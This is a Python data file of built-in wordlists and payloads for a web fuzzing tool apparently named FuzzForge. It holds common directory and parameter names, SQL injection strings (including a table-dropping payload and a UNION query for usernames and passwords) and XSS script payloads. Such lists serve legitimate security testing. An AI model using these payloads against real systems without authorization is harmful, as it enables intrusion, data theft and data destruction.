#!/usr/bin/env python3
"""
Built-in payload lists for FuzzForge.
"""

DIRECTORY_WORDLIST = [
    'admin', 'api', 'backup', 'bak', 'cgi-bin', 'config', 'console', 'css',
    'data', 'db', 'dev', 'docs', 'download', 'downloads', 'error', 'examples',
    'favicon.ico', 'files', 'fonts', 'images', 'img', 'include', 'index',
    'js', 'json', 'lib', 'login', 'logout', 'media', 'old', 'pages', 'phpmyadmin',
    'plugins', 'profile', 'public', 'robots.txt', 'sass', 'scripts', 'search',
    'security', 'server-status', 'sitemap', 'sql', 'src', 'static', 'styles',
    'system', 'test', 'tmp', 'tools', 'uploads', 'vendor', 'web', 'wordpress',
    'wp-admin', 'wp-content', 'wp-includes', 'xmlrpc.php'
]

PARAMETER_WORDLIST = [
    'id', 'user', 'username', 'email', 'name', 'page', 'cat', 'category',
    'product', 'item', 'view', 'action', 'cmd', 'exec', 'command', 'path',
    'file', 'dir', 'folder', 'url', 'redirect', 'return', 'next', 'goto',
    'lang', 'language', 'loc', 'location', 'debug', 'test', 'admin',
    'password', 'pass', 'key', 'token', 'auth', 'userid', 'account', 'profile'
]

SQLI_PAYLOADS = [
    "'", "\"", "';--", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1' AND '1'='1", "1' AND '1'='2", "' WAITFOR DELAY '0:0:5'--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "';alert('XSS');//"
]